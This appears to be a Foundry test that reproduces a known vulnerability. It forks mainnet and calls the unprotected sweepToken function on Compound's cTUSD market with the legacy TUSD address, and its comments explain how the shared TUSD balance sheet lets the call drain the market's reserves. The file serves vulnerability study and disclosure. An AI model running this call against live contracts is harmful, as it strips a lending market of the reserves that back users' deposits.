// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    ICErc20Delegate cTUSD = ICErc20Delegate(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    IERC20 tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_266_479); // fork mainnet at block 14266479
    }

    function testExample() public {
        // VULNERABILITY: Unprotected sweepToken in CErc20Delegate (missing admin-only guard)
        // Root cause: In the deployed CErc20Delegate impl (sources/CErc20Delegate_a035b9/contracts_CErc20.sol:120),
        //   function sweepToken(EIP20NonStandardInterface token) external {
        //       require(address(token) != underlying, "CErc20::sweepToken: can not sweep underlying token");
        //       uint256 balance = token.balanceOf(address(this));
        //       token.transfer(admin, balance);
        //   }
        //   has NO `require(msg.sender == admin, ...)` (contrast fixed version sources/CErc20Delegate_3363ba/contracts_CErc20.sol:125).
        // Contributing: The CErc20Delegator (0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) does not declare sweepToken
        //   in CErc20Interface (sources/CErc20Delegator_12392F/contracts_CTokenInterfaces.sol:250), so selector hits
        //   the fallback (sources/CErc20Delegator_12392F/contracts_CErc20Delegator.sol:455):
        //       function () external payable { ... implementation.delegatecall(msg.data); ... }
        //   which forwards any calldata to the impl with no auth.
        // Why vulnerable: sweepToken was a recovery helper for accidental ERC20s sent to cToken; the access control
        //   was simply omitted in this version of the delegate.
        // Impact: Permissionless drain of the cTUSD market's entire TUSD cash reserves (held via shared BalanceSheet)
        //   to the admin address, breaking 1:1 backing for outstanding cTUSD without touching totalSupply/borrows.
        //
        // EXPLOIT STEPS:
        // 1. setUp() forks mainnet at block 14266479 (L17). cTUSD.underlying() == 0x0000000000085d4780B73119b644AE5ecd22b376 (new TUSD).
        // 2. tusdLegacy (0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E) != underlying, so the single require passes.
        // 3. Any caller (here: test contract) invokes cTUSD.sweepToken(tusdLegacy) at L48. Routes via delegator fallback -> delegatecall into impl.
        // 4. balance = token.balanceOf(address(this))  [L138 in a035b9 CErc20]. Since token==legacy, legacy.balanceOf calls CanDelegate.balanceOf (TrueUSD.sol:522)
        //    which forwards to delegate.delegateBalanceOf -> StandardDelegate (TrueUSD.sol:589) -> shared BalanceSheet.balanceOf(cTUSD) (TrueUSD.sol:275).
        // 5. token.transfer(admin, balance)  [L139]. legacy.transfer (CanDelegate:509) sees delegate!=0 and calls delegate.delegateTransfer(to, value, msg.sender=cTUSD).
        //    Inside StandardDelegate.delegateTransfer (TrueUSD.sol:593): require(msg.sender == delegatedFrom) passes (delegatedFrom set to legacy addr by TUSD owner);
        //    then transferAllArgsNoAllowance(origSender=cTUSD, admin, balance) which mutates BalanceSheet: sub from cTUSD, add to admin (TrueUSD.sol:329).
        // 6. Post-sweep, tusd (new TUSD) .balanceOf(cTUSD) is now 0 (or drastically reduced), as it also resolves through the shared balances.
        //    No cToken accounting adjustment occurs (no redeem/borrow side-effect).
        //
        // The dual-address TUSD (legacy CanDelegate + new StandardDelegate sharing BalanceSheet) + use of EIP20NonStandardInterface in sweep
        //   allowed the non-underlying address to still mutate the economic balance held by cTUSD.
        emit log_named_uint("Before exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
        cTUSD.sweepToken(tusdLegacy);
        emit log_named_uint("After exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
    }
}
